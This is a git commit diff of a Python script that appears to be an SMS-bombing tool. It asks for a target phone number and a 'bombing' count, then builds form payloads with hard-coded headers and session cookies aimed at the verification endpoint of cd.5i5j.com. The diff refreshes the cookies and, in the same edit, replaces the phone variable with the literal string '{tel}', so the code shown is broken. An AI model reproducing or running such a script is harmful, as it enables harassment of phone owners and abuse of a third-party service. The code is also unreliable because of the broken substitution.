3c2d9843fff4c8bf133eb5b7744d7d8051e044a9
bookman <103754564+wspp195822@users.noreply.github.com>
2023-01-14 22:44:47 +0800

    Add files via upload

--- bookman_big.py
+++ bookman_big.py
@@ -10,9 +10,9 @@ print("""\033[0;34;40m
      |_.__/ \___/ \___/|_|\_\_| |_| |_|\__,_|_| |_|
 
 """)
-tel = str(input("输入电话号码:"))
+tel = input("输入电话号码:")
 num = int(input("轰炸次数:"))
-data1 = {'mobile': tel,'type': '1','deviceId': 'WHJMrwNw1k/G4XYz7Zf5VwQTFq6MY9kJuW8VCprGnbdU+bIHe8lnKNtAKcvdL/xBkvYh8q11Zsz1VsiuO8c1kgBUTBvvMEZ7OdCW1tldyDzmQI99+chXEioIl0lb0UxViF4FLg94PeU+vLMn6p3SpniHkvLSSe4GZIbtNikEBm645nqbECcowApFmlvWS/WAprjl+d2XxfVgh3MJ6BdlfhdCpI3Tsb+2f7xWD7mkTFhfVC1YkGmEVUmFLWtA20YVjjpbeDlb6VwRIExklGMVEHg==1487582755342'}
+data1 = {'mobile': '{tel}','type': '1','deviceId': 'WHJMrwNw1k/G4XYz7Zf5VwQTFq6MY9kJuW8VCprGnbdU+bIHe8lnKNtAKcvdL/xBkvYh8q11Zsz1VsiuO8c1kgBUTBvvMEZ7OdCW1tldyDzmQI99+chXEioIl0lb0UxViF4FLg94PeU+vLMn6p3SpniHkvLSSe4GZIbtNikEBm645nqbECcowApFmlvWS/WAprjl+d2XxfVgh3MJ6BdlfhdCpI3Tsb+2f7xWD7mkTFhfVC1YkGmEVUmFLWtA20YVjjpbeDlb6VwRIExklGMVEHg==1487582755342'}
 header1 = {
 'Accept': 'application/json, text/javascript, */*; q=0.01'
 ,'Accept-Encoding': 'gzip, deflate, br'
@@ -20,7 +20,7 @@ header1 = {
 ,'Connection': 'keep-alive'
 ,'Content-Length': '367'
 ,'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
-,'Cookie': 'PHPSESSID=8aqojqpb0tpfocevdbn9nda68d; domain=cd; historyCity=%5B%22%5Cu6210%5Cu90fd%22%5D; _ga=GA1.2.359150884.1673617886; _gid=GA1.2.709880235.1673617886; HMF_CI=d3e48c0796fa5c3b2f1700dfaf9dcb8b9fe4f307245a3505774a6d980f2d5831145e6a5a9c2bebffdad4953b0c68ae914a79ab2ea20de93bfed9522e3b0f5567c7; gr_user_id=ebd85f7d-9acf-4c34-8824-b6db0ad32337; 8fcfcf2bd7c58141_gr_session_id=9b3abb9a-f297-485c-839a-799b686b6057; 8fcfcf2bd7c58141_gr_session_id_9b3abb9a-f297-485c-839a-799b686b6057=true; Hm_lvt_94ed3d23572054a86ed341d64b267ec6=1673617887; Hm_lpvt_94ed3d23572054a86ed341d64b267ec6=1673617887; smidV2=20230113215126e9bf688c206896b18f5e1f5bb443d2bb0070b48e0250a2f60'
+,'Cookie': 'historyCity=%5B%22%5Cu6210%5Cu90fd%22%5D; _ga=GA1.2.359150884.1673617886; _gid=GA1.2.709880235.1673617886; gr_user_id=ebd85f7d-9acf-4c34-8824-b6db0ad32337; smidV2=20230113215126e9bf688c206896b18f5e1f5bb443d2bb0070b48e0250a2f60; PHPSESSID=nvjjcm2g1v4gn75n9ss5ttbkla; domain=cd; HMF_CI=d3e48c0796fa5c3b2f1700dfaf9dcb8bdebdf07e05e5dffd5ea92999220c1562885d18d78d21d36f78f7d49a298e8736541df7e94338f7a6ade5831b02ae04bb33; HMY_JC=febe874eca65c2ead69ea846f47ab13911fb5133e65b8679d14108401a2fa8e256,; _gat=1; 8fcfcf2bd7c58141_gr_session_id=3fc6dbe0-2f08-4326-abbd-9ee0dcbdde8c; 8fcfcf2bd7c58141_gr_session_id_3fc6dbe0-2f08-4326-abbd-9ee0dcbdde8c=true; Hm_lvt_94ed3d23572054a86ed341d64b267ec6=1673617887,1673702406; Hm_lpvt_94ed3d23572054a86ed341d64b267ec6=1673702406'
 ,'DNT': '1'
 ,'Host': 'cd.5i5j.com'
 ,'Origin': 'https://cd.5i5j.com'
